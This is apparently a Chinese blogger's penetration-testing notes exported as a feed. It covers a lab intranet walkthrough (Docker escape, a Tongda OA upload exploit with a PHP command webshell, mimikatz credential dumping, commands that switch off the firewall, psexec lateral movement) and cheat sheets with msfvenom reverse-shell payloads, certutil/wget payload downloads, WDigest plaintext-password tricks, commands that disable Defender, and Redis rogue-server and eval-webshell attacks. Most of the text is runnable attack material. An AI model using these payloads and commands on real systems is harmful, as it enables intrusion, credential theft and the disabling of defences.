/dev <span class="hljs-comment">#查看设备文件</span><br></code></pre></td></tr></table></figure><p>首先挂载本地磁盘到该docker目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> <span class="hljs-built_in">test</span> <br><br>mount /dev/sda1 /test <br></code></pre></td></tr></table></figure><p>在第一台主机上生成ssh文件 一个私钥一个公钥 私钥赋予权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -f <span class="hljs-built_in">test</span><br><span class="hljs-built_in">chmod</span> 600 <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>将公钥写入我们挂载到docker的磁盘文件中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp -avx <span class="hljs-regexp">/test/</span>home<span class="hljs-regexp">/ubuntu/</span>.ssh<span class="hljs-regexp">/id_rsa.pub /</span>test<span class="hljs-regexp">/home/u</span>buntu<span class="hljs-regexp">/.ssh/</span>authorized_keys<span class="hljs-comment">#看挂载到哪个文件夹下就是哪个文件下</span><br>echo &gt; <span class="hljs-regexp">/test/</span>home<span class="hljs-regexp">/ubuntu/</span>.ssh/authorized_keys<br>echo <span class="hljs-string">&#x27;生成的.pub文件的内容&#x27;</span> &gt; <span class="hljs-regexp">/test/</span>home<span class="hljs-regexp">/ubuntu/</span>.ssh/authorized_keys<br>cat <span class="hljs-regexp">/test/</span>home<span class="hljs-regexp">/ubuntu/</span>.ssh/authorized_keys<br></code></pre></td></tr></table></figure><p>直接ssh连 私钥连接 ssh -i test <a href="mailto:&#x75;&#x62;&#117;&#x6e;&#116;&#x75;&#x40;&#49;&#57;&#50;&#46;&#49;&#54;&#56;&#x2e;&#53;&#50;&#x2e;&#x32;&#48;">&#x75;&#x62;&#117;&#x6e;&#116;&#x75;&#x40;&#49;&#57;&#50;&#46;&#49;&#54;&#56;&#x2e;&#53;&#50;&#x2e;&#x32;&#48;</a></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231120190438171.png" alt="image-20231120190438171"></p><p>至此拿下第二台主机 上线msf</p><p>上线msf后记得更新路由！！</p><p>内网探测</p><p>第二台主机网卡 </p><p>上传fscan iox</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231120190634057.png" alt="image-20231120190634057"></p><p>拿建一个socks5通道</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">VPS</span>   ./iox proxy -l <span class="hljs-number">8888</span> -l <span class="hljs-number">1080</span> <br><br><span class="hljs-attribute">ubuntu</span>   ./iox proxy -r <span class="hljs-number">172.17.137.93:8888</span><br></code></pre></td></tr></table></figure><p>fscan扫描内网</p><p>xxxxxxxxxx find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -user root -perm -4000 -exec ls -ldb {} ;text</p><h2 id="第三台机子（通达OA）"><a href="#第三台机子（通达OA）" class="headerlink" title="第三台机子（通达OA）"></a>第三台机子（通达OA）</h2><p>扫描内网后发现有一台</p><p>192.168.52.30 –192.168.93.10 开放8080端口 挂好socks5代理后查看发现是一个通达oa</p><p>查看版本</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http[s]://TongDaOA.domain/inc/expired.php 判断通达版本<br></code></pre></td></tr></table></figure><p><a href="https://zhuanlan.zhihu.com/p/346513138">通达OA部分漏洞信息整合 - 知乎 (zhihu.com)</a>可以看看这个</p><p>发现有通达OA前台任意用户登录漏洞+RCE漏洞<a href="https://blog.csdn.net/szgyunyun/article/details/107104288">通达OA前台任意用户登录漏洞+RCE漏洞复现_通达oa2016漏洞-CSDN博客</a></p><p>这边是利用了任意文件执行写入msf的payload 正向连接</p><p>首先上传cmd执行文件</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ispirit/im/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>49.233.3.2:8888<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>658<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=123<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;UPLOAD_MODE&quot;</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-number">2</span></span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;P&quot;</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-number">123</span></span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;DEST_UID&quot;</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-number">1</span></span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;ATTACHMENT&quot;</span>; filename=<span class="hljs-string">&quot;jpg&quot;</span></span><br><span class="language-php">Content-Type: image/jpeg</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-variable">$command</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];</span><br><span class="language-php"><span class="hljs-variable">$wsh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">COM</span>(<span class="hljs-string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="language-php"><span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wsh</span>-&gt;<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;cmd /c &quot;</span>.<span class="hljs-variable">$command</span>);</span><br><span class="language-php"><span class="hljs-variable">$stdout</span> = <span class="hljs-variable">$exec</span>-&gt;<span class="hljs-title function_ invoke__">StdOut</span>();</span><br><span class="language-php"><span class="hljs-variable">$stroutput</span> = <span class="hljs-variable">$stdout</span>-&gt;<span class="hljs-title function_ invoke__">ReadAll</span>();</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-variable">$stroutput</span>;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br><span class="language-php">------WebKitFormBoundarypyfBh1YB4pV8McGB--</span><br></code></pre></td></tr></table></figure><p>此时会返回一个jpg路径</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231122195231974.png" alt="image-20231122195231974"></p><p>用该jpg文件路径  然后做文件包含</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ispirit/interface/gateway.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>49.233.3.2:8888<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>python-requests/2.21.0<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>69<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-dockerfile">json=&#123;<span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">&quot;/general/../../attach/im/2007/422124454.jpg&quot;</span>&#125;&amp;<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">whoami</span></span></span><br></code></pre></td></tr></table></figure><p>返回 nt authority\system时包含成功</p><p>此时我们上传我们的payload文件</p><p>这里用到的certutil文件上传</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">certutil.exe -urlcache -split -f http://example.com/a.txt<br></code></pre></td></tr></table></figure><p><a href="https://zhuanlan.zhihu.com/p/107819644">certutil 命令详解</a></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231122195519973.png" alt="image-20231122195519973"></p><p>下载到c盘后执行上线</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231122195608601.png" alt="image-20231122195608601"></p><h2 id="第四台机子（DC）"><a href="#第四台机子（DC）" class="headerlink" title="第四台机子（DC）"></a>第四台机子（DC）</h2><p>用msf自带的psexec进行横向移动<a href="https://www.freebuf.com/articles/network/251364.html">内网渗透测试：内网横向移动基础总结 - FreeBuf网络安全行业门户</a> 在192.168.52.30那台机子上进行</p><p>第一步获取域内单机密码</p><p>用msf中的mimikatz</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts">load kiwi<br><br>ps<br><br>migrate xxx(进程号)<span class="hljs-meta">#进程迁移至x64进程中</span><br><br>kiwi_cmd sekurlsa::logonpasswords<span class="hljs-meta">#读取域管理员账号和密码</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231122204111548.png" alt="image-20231122204111548"></p><p>psexec需要目标机子关闭防火墙</p><p>这里使用$IPC进行连接 sc进行命令执行<a href="https://blog.csdn.net/qq_53079406/article/details/128899133?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-128899133-blog-86555918.235%5Ev38%5Epc_relevant_anti_vip_base&spm=1001.2101.3001.4242.2&utm_relevant_index=4">【内网安全-横向移动】IPC$连接—＞计划任务—＞上线_ipc链接命令_黑色地带(崛起)的博客-CSDN博客</a></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.93.30</span>\ipc$ <span class="hljs-string">&quot;Whoami2021&quot;</span> /user:<span class="hljs-string">&quot;Administrator&quot;</span><br><br>sc \\<span class="hljs-number">192.168.93.30</span> create unablefirewall binpath=<span class="hljs-string">&quot;netsh advfirewall set allprofiles state off&quot;</span><br><br>sc \\<span class="hljs-number">192.168.93.30</span> start unablefirewall<br></code></pre></td></tr></table></figure><p>防火墙关闭以后就用psexec横向移动</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231122204236179.png" alt="image-20231122204236179"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231122204333341.png" alt="image-20231122204333341"></p><p>上线msf</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231122195701985.png" alt="image-20231122195701985"></p><h2 id="第五台机子（永恒之蓝）"><a href="#第五台机子（永恒之蓝）" class="headerlink" title="第五台机子（永恒之蓝）"></a>第五台机子（永恒之蓝）</h2><p>没复现成功不知道为啥 然后后面route断了直接摆烂</p><p>原理就永恒之蓝的ms17_010漏洞复现</p>]]></content>
      
      
      <categories>
          
          <category> Penetration </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bugku3</title>
      <link href="/2023/12/17/penetration/bugku3/"/>
      <url>/2023/12/17/penetration/bugku3/</url>
      
        <content type="html"><![CDATA[<p>.&#x2F;xray_linux_amd64 webscan –basic-crawler <a href="http://106.14.96.176/">http://106.14.96.176/</a> </p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231208141400240.png" alt="image-20231208141400240"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231208141423784.png" alt="image-20231208141423784"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231208141500725.png" alt="image-20231208141500725"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231208141622028.png" alt="image-20231208141622028"></p><p>提示内网</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231208150352687.png" alt="image-20231208150352687"></p><p>intruder开爆</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231208150146683.png" alt="image-20231208150146683"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231208153804375.png" alt="image-20231208153804375"></p>]]></content>
      
      
      <categories>
          
          <category> Penetration </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux命令</title>
      <link href="/2023/12/17/penetration/linux%E5%91%BD%E4%BB%A4%E6%B7%BB%E5%8A%A0/"/>
      <url>/2023/12/17/penetration/linux%E5%91%BD%E4%BB%A4%E6%B7%BB%E5%8A%A0/</url>
      
        <content type="html"><![CDATA[<p>linux命令</p><p>算MD5 sha之类</p><p>类型加上sum 例如 md5sum sha256sum 之类</p><p> echo -n ‘EU4EkcST8xWjIsUj1wovCw&#x3D;&#x3D;’ | md5sum | cut -d ‘ ‘ -f1</p><p>这个是算字符串的 </p><p>md5sum xxx.txt 这个是算文件的</p><p>update-alternatives –config java  更换java版本</p><p>查找文件 </p><p>find &#x2F; -name “flag”</p><p><a href="https://blog.csdn.net/l_liangkk/article/details/81294260">Linux下find命令详解_linux find 命令-CSDN博客</a></p><p><a href="https://blog.csdn.net/crisprx/article/details/104110725">小记 SUID find提权-CSDN博客</a></p><p>tar –xvf file.tar  解压 tar包<br>tar -xzvf file.tar.gz 解压tar.gz<br>tar -xjvf file.tar.bz2   解压 tar.bz2<br>tar –xZvf file.tar.Z   解压tar.Z<br>unrar e file.rar 解压rar<br>unzip file.zip 解压zip</p><p>tar –cvf jpg.tar *.jpg  将目录里所有jpg文件打包成tar.jpg<br>tar –czf jpg.tar.gz *.jpg   将目录里所有jpg文件打包成jpg.tar后，并且将其用gzip压缩，生成一个gzip压缩过的包，命名为jpg.tar.gz<br>tar –cjf jpg.tar.bz2 *.jpg 将目录里所有jpg文件打包成jpg.tar后，并且将其用bzip2压缩，生成一个bzip2压缩过的包，命名为jpg.tar.bz2<br>tar –cZf jpg.tar.Z *.jpg   将目录里所有jpg文件打包成jpg.tar后，并且将其用compress压缩，生成一个umcompress压缩过的包，命名为jpg.tar.Z<br>rar a jpg.rar *.jpg rar格式的压缩，需要先下载rar for linux<br>zip jpg.zip *.jpg   zip格式的压缩，需要先下载zip for linux</p>]]></content>
      
      
      <categories>
          
          <category> Penetration </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows命令</title>
      <link href="/2023/12/17/penetration/windows%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/12/17/penetration/windows%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>切换目录方法：输入 cd &#x2F;d E:</p><p>进入E盘其他文件夹：cd E:\文件夹</p><p>dir &#x2F;b 可以查看当前路径下的所有文件和文件夹。<br>dir &#x2F;b &#x2F;s 可以查看当前路径下的所有文件和文件夹以及子目录下的文件。</p><p>关闭防火墙：netsh firewall set opmode mode&#x3D;disable<br>关闭防火墙： netsh advfirewall set allprofiles state off<br>查看防火墙状态： netsh advfirewall show allprofiles</p><p>防火墙恢复默认配置：netsh firewall reset</p><p>关闭windows任意服务 net stop *** （net stop windefend 关闭windows自带杀毒软件windows defender）</p><p>mstsc &#x2F;console 或mstsc &#x2F;f 开启远程连接（适用于mimikatza抓到了域控管理员密码用）</p>]]></content>
      
      
      <categories>
          
          <category> Penetration </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rubbish</title>
      <link href="/2023/12/17/penetration/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%B1%87%E6%80%BB/"/>
      <url>/2023/12/17/penetration/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>千万不要exit 撑死back和background</p><p>首先判断需要反弹还是正向连接</p><p>一般能出网的用反弹，出不了网的就正向</p><p>1、先制作payload </p><p>linux</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=xx.xx.xx.xx lport=9999 -f elf &gt;reverse_9999.elf <span class="hljs-comment">#反弹</span><br>msfvenom -p linux/x64/meterpreter/bind_tcp lport=9999 -f elf &gt;bind_9999.elf<span class="hljs-comment">#正向</span><br></code></pre></td></tr></table></figure><p>windows</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=xx.xx.xx.xx <span class="hljs-attribute">lport</span>=9999 -f exe &gt;reverse_9999.exe #反弹<br>msfvenom -p windows/meterpreter/bind_tcp <span class="hljs-attribute">lport</span>=9999 -f exe &gt;bind_9999.exe#正向<br></code></pre></td></tr></table></figure><p>linux 一般为elf windows为exe   （在杀软能绕过用，这两为可执行文件</p><p>2、上传payload</p><p>如果有网站可以用蚁剑上传</p><p>如果linux中可以用</p><p>VPS上 python3 -m http.server 12345 开启一个web服务供下载</p><p>靶机上 wget <a href="http://xx.xx..xx.xx:12345/xx.elf">http://xx.xx..xx.xx:12345/xx.elf</a> 下载</p><p>如果在windows上可以用 certutil <a href="https://zhuanlan.zhihu.com/p/107819644">Windows上自带的渗透测试工具：Certutil</a></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">certutil.exe -urlcache -split -f http://example.com/a.txt<br></code></pre></td></tr></table></figure><p>如果在域控中可以用$LCK (待补充)</p><p>然后上线msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br><br>use exploit/multi/handler<br><br>show options <span class="hljs-comment">#看一下需要的payload 根据要填的填rhost lport</span><br><br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp <span class="hljs-comment">#这步根据生成的payload进行填写</span><br><br><span class="hljs-built_in">set</span> lport  xxxx<br><br><span class="hljs-built_in">set</span> rhost xx.xx.xx.xx <span class="hljs-comment">#根据上面options选填</span><br><br>run<br></code></pre></td></tr></table></figure><p>执行payload文件 正向先开 反弹后开</p><p>上线以后首先获取路由信息 为后面跨网段渗透铺路</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> autoroute<br><br><span class="hljs-built_in">run</span> post/multi/manage/autoroute<br><br><span class="hljs-built_in">run</span> autoroute -p#查看所有路由表<br></code></pre></td></tr></table></figure><p>退出当前sessions 用</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">background<br></code></pre></td></tr></table></figure><p>查看所有sessions 用</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sessions</span> <br></code></pre></td></tr></table></figure><p>使用某个session </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sessions -<span class="hljs-selector-tag">i</span> x -k（杀死清除）<br></code></pre></td></tr></table></figure><p>设置socks代理</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> Proxies <span class="hljs-comment">socks5:127.0.0.1:1081</span><br></code></pre></td></tr></table></figure><h2 id="利用ipc管道-和sc的横向移动"><a href="#利用ipc管道-和sc的横向移动" class="headerlink" title="利用ipc管道 和sc的横向移动"></a>利用ipc管道 和sc的横向移动</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.93.30</span>\ipc$ <span class="hljs-string">&quot;Whoami2021&quot;</span> /user:<span class="hljs-string">&quot;Administrator&quot;</span><br><br>sc \\<span class="hljs-number">192.168.93.30</span> create unablefirewall binpath=<span class="hljs-string">&quot;netsh advfirewall set allprofiles state off&quot;</span><br><br>sc \\<span class="hljs-number">192.168.93.30</span> start unablefirewall<br></code></pre></td></tr></table></figure><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">提升权限   privilege::debug<br><br>抓取明文密码 sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p>win12及以上被取消了，可通过修改注册表设置允许存储明文密码，并让其系统强制锁屏，等待管理员重新输入账号密码后，即可抓取到明文密码。</p><p>修改注册表(管理员权限)</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1</span><br></code></pre></td></tr></table></figure><p>powershell执行命令强制锁屏</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">Function</span> <span class="hljs-title function_">Lock</span>-<span class="hljs-title function_">WorkStation</span> &#123; <span class="hljs-symbol">$sig</span>nature = @<span class="hljs-string">&quot; [DllImport (&quot;</span>user32.dll<span class="hljs-string">&quot;, SetLastError = true)] public static extern bool LockWorkStation(); &quot;</span>@ <span class="hljs-symbol">$Loc</span>kWorkStation = Add-Type -memberDefinition <span class="hljs-symbol">$sig</span>nature -name <span class="hljs-string">&quot;Win32LockWorkStation&quot;</span> -namespace Win32Functions -passthru <span class="hljs-symbol">$Loc</span>kWorkStation::LockWorkStation() | Out-<span class="hljs-literal">Null</span> &#125; Lock-WorkStation<br></code></pre></td></tr></table></figure><h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><p><a href="https://keanes.blog.csdn.net/article/details/127753716">Redis未授权四种利用方式与修复方案</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Redis基本操作<br><br><span class="hljs-built_in">set</span> testkey “hello” - 创建一个键值对<br>keys * 显示所有键<br>delxxx 删除键为key的数据<br><span class="hljs-built_in">get</span> xxx 读key的内容<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dir /home/test 设置工作目录<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename redis.rdb 设置备份为减价<br>save 进行一次备份操作<br></code></pre></td></tr></table></figure><h4 id="redis主从复制RCE"><a href="#redis主从复制RCE" class="headerlink" title="redis主从复制RCE"></a>redis主从复制RCE</h4><p>漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指一个redis作为主机，其他为备份机，主从数据相同，从机去读，主机写。在Redis4.x之后，通过外部扩展，可以实现redis中实现一个新的redis命令，构造恶意.so文件，在两个redis实例设置主从模式，redis主机实例可以通过FULLRESYNC同步文件到从机上，在从机家在恶意so文件，从而执行文件。</p><p>影响版本：redis&lt;&#x3D;5.05<br>工具下载：<br><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a>  (&#x2F;root&#x2F;tool&#x2F;poc&#x2F;applicationserver&#x2F;redis-rogue-server-master&#x2F;)</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> redis-rogue-server.py --rhost <span class="hljs-number">192.168.0.109</span> --lhost <span class="hljs-number">192.168.0.145</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240123142200112.png" alt="image-20240123142200112"></p><p>弹一个shell去vps上</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240123142235121.png" alt="image-20240123142235121"></p><h4 id="Redis写WEBSHELL"><a href="#Redis写WEBSHELL" class="headerlink" title="Redis写WEBSHELL"></a>Redis写WEBSHELL</h4><p>需要知道网站物理路径</p><p>获取网站路径方式：1、报错 2、phpinfo 3、配置文件 4、 数据库 5、相关数据泄漏</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">redis:6379&gt; config set dir /var/www/html/</span><br><span class="language-xml">redis:6379&gt; config set dbfilename shell.php</span><br><span class="language-xml">redis:6379&gt; set x &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ant&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br><span class="language-xml">redis:6379&gt; save</span><br></code></pre></td></tr></table></figure><h4 id="Redis写入ssh公钥登录"><a href="#Redis写入ssh公钥登录" class="headerlink" title="Redis写入ssh公钥登录"></a>Redis写入ssh公钥登录</h4><p>利用条件：<br>1、Redis服务使⽤ROOT账号启动、且可未授权登陆<br>2、服务器开放了SSH服务，⽽且允许使⽤密钥登录，即可远程写⼊⼀个公钥，直接登录远程 服务器。<br>生成密钥公钥</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 